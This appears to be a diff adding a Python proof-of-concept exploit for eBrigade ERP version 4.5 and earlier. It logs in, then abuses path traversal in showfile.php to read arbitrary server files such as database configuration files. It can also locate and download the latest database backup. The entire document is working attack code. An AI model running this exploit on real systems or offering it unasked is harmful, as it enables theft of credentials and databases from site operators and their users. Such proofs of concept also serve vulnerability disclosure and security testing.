@@ -1,0 +1,123 @@
+#!/usr/bin/python
+  
+import mechanize, sys, cookielib, requests
+import colorama, urllib, re, random, urllib2
+import wget
+from colorama import Fore
+from tqdm import tqdm
+from pathlib import Path
+ 
+def bannerche():
+    print '''
+ @-------------------------------------------------------------@
+ |  eBrigade ERP <= 4.5 - Database Backup Disclosure via AFD   |
+ |            Vulnerability discovered by AkkuS                |
+ |            My Blog - https://pentest.com.tr                 |
+ @-------------------------------------------------------------@
+          '''
+bannerche()
+  
+if (len(sys.argv) != 2):
+    print "[*] Usage: poc.py <RHOST>"
+    exit(0)
+  
+rhost = sys.argv[1]
+UserName = str(raw_input("Identifiant: ")) # Administrator/User Username Input
+Password = str(raw_input("Password: "))  # Administrator/User Password Input
+  
+print(Fore.BLUE + "+ [*] Getting login permission...")
+br = mechanize.Browser()                 # set cookies
+br.set_handle_robots(False)
+cj = cookielib.LWPCookieJar()
+br.set_cookiejar(cj)
+  
+br.open("http://"+rhost+"/")             # User Access Login
+assert br.viewing_html()
+br.select_form(nr=0)
+br.form['id'] = UserName
+br.form['pwd'] = Password
+br.submit()
+
+##
+# Login Access and Version Control
+##
+  
+LoginControl = requests.get("http://"+rhost+"/index_d.php", cookies=cj)
+HTMLdata = LoginControl.text 
+
+finder = re.findall(r'version<b> 4.5', HTMLdata)
+try:
+    version = finder[0].replace('"','').replace('<b>','').strip()
+except IndexError:
+    pass 
+try:
+    if version == "version 4.5":
+       print (Fore.GREEN + "+ [*] Login successful")
+except NameError:
+    pass
+    print (Fore.RED + "+ [*] User information is incorrect or version incompatible")
+##
+# Introducing Cookie and CSRF token information
+##
+
+print (Fore.BLUE + "+ [*] Select Exploit Type:")
+print (Fore.YELLOW +"- [*] 1 - Arbitrary File Download/Read (Ex: /conf/sql.php)")
+print ("- [*] 2 - Database Backup File Download")
+choice = int(raw_input("- [*] Enter a number (1 or 2) : "))
+
+if choice == 1:
+    print (Fore.BLUE + "+ [*] Select the file you want to Download/Read:")
+    print (Fore.YELLOW + "- [*] 1 - /conf/sql.php")
+    print ("- [*] 2 - /config.php")
+    print ("- [*] 3 - /.htaccess.template")
+    print ("- [*] 4 - Manual exploitation")
+    AFDc = int(raw_input("- [*] Enter a number : "))
+    if AFDc == 1:
+        AFD1 = requests.get("http://"+rhost+"/showfile.php?section=0&pompier=1&file=../../../conf/sql.php",  cookies=cj)
+        print AFD1.text
+    elif AFDc == 2:
+        AFD2 = requests.get("http://"+rhost+"/showfile.php?section=0&pompier=1&file=../../../config.php",  cookies=cj)
+        print AFD2.text
+    elif AFDc == 3:
+        AFD3 = requests.get("http://"+rhost+"/showfile.php?section=0&pompier=1&file=../../../.htaccess.template",  cookies=cj)
+        print AFD3.text
+    elif AFDc == 4:
+        print (Fore.RED +"- [!] You must have knowledge of files and directories")
+        AFDmc = str(raw_input(Fore.BLUE + "+ [*] Enter file name (Ex: /lib/PHPMailer/class.smtp.php) : "))
+        AFD4 = requests.get("http://"+rhost+"/showfile.php?section=0&pompier=1&file=../../.."+AFDmc+"",  cookies=cj)
+        if AFD4.status_code == 200:
+           try:
+               mdata = AFD4.text 
+               Le = re.findall(r'javascript:history.back', mdata)
+               LeClean = Le[0].replace('"','').strip()
+               if LeClean == "javascript:history.back":
+                  print (Fore.RED + "+ [X] The directory and file name you entered could not be found or incorrect")
+           except IndexError:
+               pass
+               print AFD4.text
+        else:
+           print (Fore.RED + "+ [X] Unable to access file")
+           sys.exit()
+    else:
+        print("Invalid input!")
+
+elif choice == 2:
+
+    backupfiles = requests.get("http://"+rhost+"/restore.php?file=",  cookies=cj)
+    RecentesData = backupfiles.text
+    finder = re.findall(r'a href=".*"', RecentesData)
+    names = finder[0].replace('"','').replace('javascript:deletefile','').replace('a href=javascript:restore','').replace('save','').replace("'",'').replace('(','').replace(')','').replace(',','').strip()
+    print ("+ [*] Backup File Name : " + names)
+
+    DB = requests.get("http://"+rhost+"/showfile.php?section=0&pompier=1&file=../../../user-data/save/"+names+"",  cookies=cj)
+
+    with open(names, "wb") as handle:
+        for data in tqdm(DB.iter_content()):
+            handle.write(data)
+
+    p = str(Path.cwd())
+    print(Fore.GREEN + "+ [*] Backup successfully downloaded. Directory path : " + p + "/" + names)
+else:
+    print("Invalid input!")
+
+# end
